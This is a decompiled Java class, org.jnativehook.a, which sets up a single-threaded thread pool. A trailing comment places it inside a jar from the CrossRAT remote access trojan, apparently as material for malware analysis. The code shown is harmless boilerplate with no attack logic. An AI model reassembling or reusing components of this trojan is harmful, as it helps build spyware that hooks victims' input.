package org.jnativehook;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public final class a
  extends ThreadPoolExecutor
{
  public a()
  {
    super(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue(), new b());
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\org\jnativehook\a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */